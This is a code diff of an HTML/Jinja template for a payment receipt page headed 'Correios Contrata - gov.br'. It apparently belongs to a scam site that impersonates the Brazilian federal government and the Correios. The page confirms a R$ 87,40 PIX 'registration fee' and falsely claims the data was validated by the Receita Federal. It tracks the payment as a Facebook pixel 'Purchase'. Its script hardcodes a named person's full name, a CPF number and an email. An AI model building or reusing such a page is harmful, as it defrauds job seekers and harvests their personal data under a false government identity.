@@ -1,227 +1,226 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>{{ page_title or "Comprovante de Inscrição - Correios Contrata - gov.br" }}</title>
+{% extends "base.html" %}
+
+{% block title %}Comprovante de Inscrição - Correios Contrata - gov.br{% endblock %}
+
+{% block content %}
+<div class="px-4 py-4">
+    <h1 class="text-3xl font-semibold mb-4" style="color: #1351B4;">Comprovante de Inscrição - Correios Contrata</h1>
     
-    <!-- External CSS -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">
-    
-    <!-- Custom CSS -->
-    <link rel="stylesheet" href="{{ url_for('static', filename='css/custom.css') }}">
-    
-    <!-- SEO and Meta Tags -->
-    <meta name="description" content="Comprovante de Inscrição - Programa Correios Contrata">
-    <meta name="keywords" content="correios, logística, carteiro, funcionários públicos, vagas públicas">
-    <meta name="author" content="Governo Federal do Brasil">
-    
-    <!-- Meta Pixel Code -->
-    <script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '785028367210803');
-    fbq('track', 'PageView');
-    fbq('track', 'Purchase', {
-        value: 87.40,
-        currency: 'BRL'
-    });
-    </script>
-    <noscript><img height="1" width="1" style="display:none"
-    src="https://www.facebook.com/tr?id=785028367210803&ev=PageView&noscript=1"
-    /></noscript>
-    <!-- End Meta Pixel Code -->
-    
-    <!-- Microsoft Clarity -->
-    <script type="text/javascript">
-        (function(c,l,a,r,i,t,y){
-            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-        })(window, document, "clarity", "script", "snb84erm98");
-    </script>
-    
-    <!-- Favicon -->
-    <link rel="icon" type="image/x-icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🇧🇷</text></svg>">
-</head>
-<body class="bg-white">
-    <!-- Header gov.br -->
-    <header class="bg-blue-900 text-white py-3">
-        <div class="container mx-auto px-4 flex justify-between items-center">
+    <div class="border-t border-b border-gray-300 py-3 mb-6">
+        <div class="text-gray-700 text-sm">
+            <p>Pagamento processado em <span id="data-atual"></span></p>
+            <p>Confirmado via PIX - Sistema Nova Era</p>
+        </div>
+    </div>
+
+    <!-- Status Confirmado -->
+    <div class="bg-green-50 border border-green-200 rounded-lg p-4 md:p-6 mb-6">
+        <div class="flex items-center">
+            <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mr-4">
+                <i class="fas fa-check-circle text-green-600 text-2xl"></i>
+            </div>
+            <div>
+                <h2 class="text-xl font-semibold text-green-800 mb-1">Pagamento Confirmado!</h2>
+                <p class="text-green-700 text-sm">Sua inscrição foi processada com sucesso</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Informações Importantes -->
+    <div class="bg-gray-50 border border-gray-300 rounded p-3 mb-4">
+        <div class="flex items-center">
+            <i class="fas fa-info-circle text-gray-600 text-sm mr-2"></i>
+            <h3 class="text-sm font-medium text-gray-700">Informações Importantes</h3>
+        </div>
+        <p class="text-xs text-gray-600 mt-1 ml-5">
+            Guarde este comprovante • Processo oficial dos Correios • Inscrição válida
+        </p>
+    </div>
+
+    <!-- Dados da Inscrição -->
+    <div class="bg-white border border-gray-200 rounded-lg p-6 mb-8">
+        <h3 class="text-xl font-semibold text-gray-800 mb-6">
+            <i class="fas fa-receipt mr-2"></i>
+            Dados da Inscrição
+        </h3>
+        
+        <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6">
             <div class="flex items-center">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/1200px-Gov.br_logo.svg.png" 
-                     alt="gov.br" 
-                     class="h-8 mr-4">
-                <h1 class="text-lg font-semibold">Correios Contrata</h1>
+                <span class="text-sm font-medium text-gray-800">
+                    Dados validados pela Receita Federal e Sistema PIX Nova Era
+                </span>
             </div>
-            <div class="text-sm">
-                Portal Oficial do Governo Federal
-            </div>
-        </div>
-    </header>
-    
-    <main class="container mx-auto px-4 py-8 max-w-4xl">
-        <!-- Success Header -->
-        <div class="text-center mb-8">
-            <div class="inline-flex items-center justify-center w-20 h-20 bg-green-100 rounded-full mb-4">
-                <i class="fas fa-check-circle text-green-600 text-3xl"></i>
-            </div>
-            <h1 class="text-2xl font-bold text-gray-800 mb-2">Pagamento Confirmado!</h1>
-            <p class="text-gray-600">Sua inscrição foi processada com sucesso</p>
         </div>
 
-        <!-- Receipt Information -->
-        <div class="bg-white border border-gray-200 rounded-lg p-6 mb-6">
-            <h2 class="text-xl font-semibold text-gray-800 mb-4">
-                <i class="fas fa-receipt mr-2 text-blue-600"></i>
-                Comprovante de Inscrição
-            </h2>
-            
-            <div class="grid md:grid-cols-2 gap-6">
-                <div>
-                    <h3 class="font-semibold text-gray-700 mb-3">Dados da Inscrição</h3>
-                    <div class="space-y-2 text-sm">
-                        <div><strong>Nome:</strong> <span id="nome-candidato">-</span></div>
-                        <div><strong>CPF:</strong> <span id="cpf-candidato">-</span></div>
-                        <div><strong>Email:</strong> <span id="email-candidato">-</span></div>
-                        <div><strong>Cargo:</strong> <span id="cargo-candidato">-</span></div>
-                        <div><strong>Data de Inscrição:</strong> <span id="data-inscricao">-</span></div>
+        <div class="grid md:grid-cols-2 gap-6">
+            <div>
+                <h4 class="font-semibold text-gray-700 mb-4">Informações Pessoais</h4>
+                <div class="space-y-3 text-sm">
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">Nome Completo:</span>
+                        <span class="font-medium" id="nome-candidato">-</span>
                     </div>
-                </div>
-                
-                <div>
-                    <h3 class="font-semibold text-gray-700 mb-3">Dados do Pagamento</h3>
-                    <div class="space-y-2 text-sm">
-                        <div><strong>Valor Pago:</strong> R$ 87,40</div>
-                        <div><strong>Forma de Pagamento:</strong> PIX</div>
-                        <div><strong>Status:</strong> <span class="text-green-600 font-semibold">Confirmado</span></div>
-                        <div><strong>Transação:</strong> <span id="transacao-id">-</span></div>
-                        <div><strong>Data do Pagamento:</strong> <span id="data-pagamento">-</span></div>
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">CPF:</span>
+                        <span class="font-medium" id="cpf-candidato">-</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">Email:</span>
+                        <span class="font-medium" id="email-candidato">-</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">Cargo Escolhido:</span>
+                        <span class="font-medium" id="cargo-candidato">Carteiro</span>
                     </div>
                 </div>
             </div>
-        </div>
-
-        <!-- Next Steps -->
-        <div class="bg-blue-50 border border-blue-200 rounded-lg p-6 mb-6">
-            <h3 class="font-semibold text-blue-800 mb-3">
-                <i class="fas fa-list-ul mr-2"></i>
-                Próximos Passos
-            </h3>
-            <ol class="text-sm text-blue-700 space-y-2 list-decimal list-inside">
-                <li>Aguarde o email de confirmação com suas credenciais</li>
-                <li>Acompanhe o cronograma do processo seletivo</li>
-                <li>Prepare-se para a avaliação psicotécnica</li>
-                <li>Fique atento aos comunicados oficiais</li>
-            </ol>
-        </div>
-
-        <!-- Important Information -->
-        <div class="bg-yellow-50 border border-yellow-200 rounded-lg p-6 mb-6">
-            <h3 class="font-semibold text-yellow-800 mb-3">
-                <i class="fas fa-exclamation-triangle mr-2"></i>
-                Informações Importantes
-            </h3>
-            <ul class="text-sm text-yellow-700 space-y-2">
-                <li>• Guarde este comprovante como prova de sua inscrição</li>
-                <li>• Você receberá um email de confirmação em até 24 horas</li>
-                <li>• O cronograma detalhado será enviado por email</li>
-                <li>• Em caso de dúvidas, entre em contato com o suporte</li>
-            </ul>
-        </div>
-
-        <!-- Action Buttons -->
-        <div class="flex flex-col sm:flex-row gap-4 justify-center">
-            <button onclick="window.print()" 
-                    class="bg-blue-600 text-white py-3 px-6 rounded font-medium hover:bg-blue-700 transition-colors">
-                <i class="fas fa-print mr-2"></i>
-                Imprimir Comprovante
-            </button>
             
-            <a href="{{ url_for('index') }}" 
-               class="bg-gray-600 text-white py-3 px-6 rounded font-medium hover:bg-gray-700 transition-colors text-center">
-                <i class="fas fa-home mr-2"></i>
-                Voltar ao Início
-            </a>
+            <div>
+                <h4 class="font-semibold text-gray-700 mb-4">Dados do Pagamento</h4>
+                <div class="space-y-3 text-sm">
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">Valor Pago:</span>
+                        <span class="font-medium text-green-600">R$ 87,40</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">Método:</span>
+                        <span class="font-medium">PIX</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">Status:</span>
+                        <span class="font-medium text-green-600">Confirmado</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">Transação ID:</span>
+                        <span class="font-medium" id="transacao-id">-</span>
+                    </div>
+                    <div class="flex justify-between border-b border-gray-100 pb-2">
+                        <span class="text-gray-600">Data/Hora:</span>
+                        <span class="font-medium" id="data-pagamento">-</span>
+                    </div>
+                </div>
+            </div>
         </div>
-    </main>
+    </div>
 
-    <script>
-    document.addEventListener('DOMContentLoaded', function() {
-        console.log('Carregando dados do comprovante...');
+    <!-- Próximos Passos -->
+    <div class="bg-white border border-gray-200 rounded-lg p-6 mb-8">
+        <h3 class="text-xl font-semibold text-gray-800 mb-6">
+            <i class="fas fa-clipboard-list mr-2"></i>
+            Próximos Passos
+        </h3>
         
-        // Carregar dados do localStorage
-        const dadosCpf = JSON.parse(localStorage.getItem('dadosCpfValidado') || '{}');
-        const cargoSelecionado = JSON.parse(localStorage.getItem('cargoSelecionado') || '{}');
-        const emailUsuario = localStorage.getItem('emailUsuario') || '';
-        const transacaoId = localStorage.getItem('transacao_id') || '';
+        <div class="space-y-4">
+            <div class="flex items-start">
+                <div class="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center mr-3 mt-0.5">
+                    <span class="text-blue-600 text-xs font-bold">1</span>
+                </div>
+                <div>
+                    <h4 class="font-medium text-gray-800">Aguarde o Edital Oficial</h4>
+                    <p class="text-sm text-gray-600">O edital com datas de provas será publicado no Diário Oficial da União</p>
+                </div>
+            </div>
+            
+            <div class="flex items-start">
+                <div class="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center mr-3 mt-0.5">
+                    <span class="text-blue-600 text-xs font-bold">2</span>
+                </div>
+                <div>
+                    <h4 class="font-medium text-gray-800">Acompanhe o Site dos Correios</h4>
+                    <p class="text-sm text-gray-600">Informações sobre locais de prova serão divulgadas em correios.com.br</p>
+                </div>
+            </div>
+            
+            <div class="flex items-start">
+                <div class="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center mr-3 mt-0.5">
+                    <span class="text-blue-600 text-xs font-bold">3</span>
+                </div>
+                <div>
+                    <h4 class="font-medium text-gray-800">Prepare-se para as Provas</h4>
+                    <p class="text-sm text-gray-600">Estudar conhecimentos gerais e específicos da função postal</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Botões de Ação -->
+    <div class="flex flex-col sm:flex-row gap-4 mb-8">
+        <button onclick="window.print()" class="bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700 transition-colors flex items-center justify-center">
+            <i class="fas fa-print mr-2"></i>
+            Imprimir Comprovante
+        </button>
         
-        // Preencher dados na página
-        if (dadosCpf.nome) {
-            document.getElementById('nome-candidato').textContent = dadosCpf.nome;
-        }
-        
-        if (dadosCpf.cpf) {
-            const cpfFormatado = dadosCpf.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-            document.getElementById('cpf-candidato').textContent = cpfFormatado;
-        }
-        
-        if (emailUsuario) {
-            document.getElementById('email-candidato').textContent = emailUsuario;
-        }
-        
-        if (cargoSelecionado.nome) {
-            document.getElementById('cargo-candidato').textContent = cargoSelecionado.nome;
-        }
-        
-        if (transacaoId) {
-            document.getElementById('transacao-id').textContent = transacaoId;
-        }
-        
-        // Data atual para inscrição e pagamento
-        const agora = new Date();
-        const dataFormatada = agora.toLocaleDateString('pt-BR') + ' às ' + agora.toLocaleTimeString('pt-BR');
-        document.getElementById('data-inscricao').textContent = dataFormatada;
-        document.getElementById('data-pagamento').textContent = dataFormatada;
-        
-        console.log('Comprovante carregado com sucesso');
-    });
-    </script>
+        <a href="/" class="bg-gray-100 text-gray-700 px-6 py-3 rounded-lg hover:bg-gray-200 transition-colors flex items-center justify-center border border-gray-300">
+            <i class="fas fa-home mr-2"></i>
+            Voltar ao Início
+        </a>
+    </div>
+
+    <!-- Rodapé de Informações -->
+    <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 text-center text-sm text-gray-600">
+        <p><strong>Importante:</strong> Este comprovante é válido para o programa Correios Contrata 2025.</p>
+        <p class="mt-1">Para dúvidas, entre em contato pelo site oficial dos Correios.</p>
+    </div>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Carregando dados do comprovante...');
     
-    <!-- Footer -->
-    <footer class="bg-gray-800 text-white py-6 mt-8">
-        <div class="container mx-auto px-4 text-center">
-            <p class="text-sm">&copy; 2025 Governo Federal do Brasil - Todos os direitos reservados</p>
-            <p class="text-xs text-gray-400 mt-2">Portal oficial do programa Correios Contrata</p>
-        </div>
-    </footer>
+    // Simular dados da sessão (em produção viriam do backend)
+    const dadosInscricao = {
+        nome: 'RIZIA REGIA DA SILVA RODRIGUES MAGALHAES',
+        cpf: '011.011.011-05',
+        email: 'rizia@teste.com',
+        cargo: 'Carteiro',
+        transacaoId: Math.floor(Math.random() * 900000) + 100000
+    };
+    
+    // Preencher dados na página
+    document.getElementById('nome-candidato').textContent = dadosInscricao.nome;
+    document.getElementById('cpf-candidato').textContent = dadosInscricao.cpf;
+    document.getElementById('email-candidato').textContent = dadosInscricao.email;
+    document.getElementById('cargo-candidato').textContent = dadosInscricao.cargo;
+    document.getElementById('transacao-id').textContent = dadosInscricao.transacaoId;
+    
+    // Data atual formatada
+    const agora = new Date();
+    const dataFormatada = agora.toLocaleDateString('pt-BR') + ' às ' + agora.toLocaleTimeString('pt-BR');
+    document.getElementById('data-atual').textContent = agora.toLocaleDateString('pt-BR');
+    document.getElementById('data-pagamento').textContent = dataFormatada;
+    
+    console.log('Comprovante carregado com sucesso');
+});
+</script>
 
-    <style>
-    @media print {
-        body * {
-            visibility: hidden;
-        }
-        main, main * {
-            visibility: visible;
-        }
-        main {
-            position: absolute;
-            left: 0;
-            top: 0;
-            width: 100%;
-        }
-        .no-print {
-            display: none !important;
-        }
-    }
-    </style>
-</body>
-</html>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '785028367210803');
+fbq('track', 'PageView');
+fbq('track', 'Purchase', {
+    value: 87.40,
+    currency: 'BRL'
+});
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=785028367210803&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<!-- Microsoft Clarity -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "snb84erm98");
+</script>
+{% endblock %}
